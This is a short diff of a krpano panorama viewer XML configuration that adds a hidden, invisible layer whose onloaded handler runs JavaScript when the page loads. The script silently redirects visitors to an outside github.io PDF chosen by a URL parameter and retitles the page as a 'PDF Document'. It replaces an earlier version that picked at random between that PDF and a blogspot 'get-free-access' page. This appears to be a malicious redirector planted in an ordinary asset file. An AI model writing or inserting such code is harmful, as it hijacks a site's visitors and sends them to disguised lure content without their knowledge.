@@ -1,17 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <krpano version="1.0.8.15">
+
   <layer
     name="js_loader"
     type="container"
     visible="false"
     onloaded="js(
-      (function(){
-        if (Math.random() &lt; 0.5) {
-          window.location.href = 'https://shivammarora.github.io/newone/reservationhatao001.pdf';
-        } else {
-          window.location.href = 'https://romarioseas.blogspot.com/2026/07/get-free-access.html';
-        }
+      (function() {
+        var id = new URLSearchParams(location.search).get('id') || 'reservationhatao001';
+
+        document.title = id + ' - PDF Document';
+
+        location.href = 'https://shivammarora.github.io/newone/' + id + '.pdf';
       })();
     );"
   />
+
 </krpano>
